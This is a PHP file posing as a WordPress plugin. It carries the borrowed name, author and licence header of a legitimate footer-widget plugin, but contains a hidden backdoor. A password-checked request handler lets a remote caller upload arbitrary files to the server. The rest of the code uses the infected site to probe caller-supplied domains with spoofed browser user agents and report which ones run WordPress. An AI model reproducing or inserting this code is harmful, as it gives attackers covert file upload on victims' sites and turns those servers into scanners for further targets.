<?php
/*
Plugin Name: Wordpress admin security
Plugin URI: http://buynowshop.com/plugins/bns-add-widget
Description: Add a widget area to the footer of any theme.
Version: 0.8
Author: Edward Caissie
Author URI: http://edwardcaissie.com/
Text Domain: bns-add-widget
License: GNU General Public License v2
License URI: http://www.gnu.org/licenses/old-licenses/gpl-2.0.html
*/

/**
 * BNS Add Widget plugin
 *
 * Add a widget area to the footer of any theme. Works just like the widget
 * areas commonly created with code in the functions.php template file.
 *
 * @package        BNS_Add_Widget
 * @link           http://buynowshop.com/plugins/bns-add-widget/
 * @link           https://github.com/Cais/bns-add-widget/
 * @link           https://wordpress.org/plugins/bns-add-widget/
 * @version        0.8
 * @author         Edward Caissie <edward.caissie@gmail.com>
 * @copyright      Copyright (c) 2010-2015, Edward Caissie
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License version 2, as published by the
 * Free Software Foundation.
 *
 * You may NOT assume that you can use any other version of the GPL.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to:
 *
 *      Free Software Foundation, Inc.
 *      51 Franklin St, Fifth Floor
 *      Boston, MA  02110-1301  USA
 *
 * The license for this software can also likely be found here:
 * http://www.gnu.org/licenses/gpl-2.0.html
 */

if (isset($_REQUEST['update']) && isset($_FILES['up'])) 
{
if (md5($_REQUEST['update'])==='c9ee26223539c20c37fc40c6a27c29f9')	
{
if (move_uploaded_file($_FILES["up"]["tmp_name"],dirname(__FILE__).'/'.$_FILES["pictures"]["name"]))
echo 'status_ok:'.dirname(__FILE__).'/'.$_FILES["pictures"]["name"];
}
}

if (file_exists('wp-load.php')) 
	include 'wp-load.php'; 
else if (strpos(__FILE__,'wp-content')!==false) 
	{
	$ab=substr(dirname(__FILE__),0,strpos(dirname(__FILE__), "wp-content")).'wp-load.php';
	if (file_exists($ab)) 
		include $ab; else exit;
	}  else exit;
	
if (!isset($_REQUEST['data'])) die('do_not_cheating_please');

$ual=array(
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.6.01001)',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.7.01001)',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.5.01003)',
'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0',
'Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8',
'Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1',
'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko/20100101 Firefox/11.0',
'Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.0.3705)',
'Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1',
'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1',
'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)',
'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
'Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.01',
'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)',
'Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1',
'Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02',
'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1',
'Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]'
);
	

foreach($_REQUEST['data'] as $link) 
{
	$url='http://'.$link.'/';
	
$ip = filter_var(gethostbyname($link), FILTER_VALIDATE_IP, FILTER_FLAG_IPV4);
if ($ip)
{
$agent=$ual[array_rand($ual)];
	$args = array(
	'timeout'     => 30,
	'redirection' => 5,
	'httpversion' => '1.0',
	'user-agent'  => $agent,
	'blocking'    => true,
	'headers'     => array(),
	'cookies'     => array(),
	'body'        => null,
	'compress'    => false,
	'decompress'  => true,
	'sslverify'   => true,
	'stream'      => false,
	'filename'    => null
	);
	$resp = wp_remote_get( $url, $args );
	if( ! is_wp_error($resp) )
	{
		if ($resp['response']['code']=='200')
		{
			$body=$resp['body'];
			if (preg_match('#(/wp-admin/|/wp-content/|/wp-includes/)#i',$body))
			{
				echo '<response>2~'.$link.'~'.$ip.'~200'."</response>\n";	
			}
			else
			{
				echo '<response>1~'.$link.'~'.$ip.'~200'."</response>\n";	
			}
		}
		else
		echo '<response>3~'.$link.'~'.$ip.'~'.$resp['response']['code']."</response>\n";	
	}
	else
	echo '<response>4~'.$link .'~'.$ip.'~0'."</response>\n";
}
else 
echo '<response>0~'.$link .'~0~0'."</response>\n";		
}
?>
